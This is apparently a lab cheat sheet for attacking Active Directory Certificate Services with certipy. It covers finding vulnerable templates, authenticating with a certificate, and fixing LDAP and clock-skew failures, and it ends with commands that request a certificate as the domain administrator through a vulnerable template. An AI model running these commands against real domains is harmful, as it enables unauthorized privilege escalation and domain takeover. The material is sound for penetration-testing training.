## Find vulnerable templates

**Kali**

```bash
certipy find -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -dc-ip DC_IP -vulnerable -stdout
```

Use the DC address for LDAP enumeration, not the CA address.

## Authenticate with a certificate

**Kali**

```bash
certipy auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
```

DNS, DC time, and certificate identity must match the lab.

## If it fails

| Symptom | Check |
| --- | --- |
| LDAP timeout | Check DC_IP, routing, and LDAP reachability. The CA and DC may be different hosts. |
| Kerberos clock skew | Compare your time with the DC, including date and timezone; internet time may differ from lab time. |

**AD Certificate Services: Quick Reference**

```bash
# request a cert AS the domain admin
certipy req -u USER@$DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN -dc-ip $DC

certipy auth -pfx administrator.pfx -dc-ip $DC
```
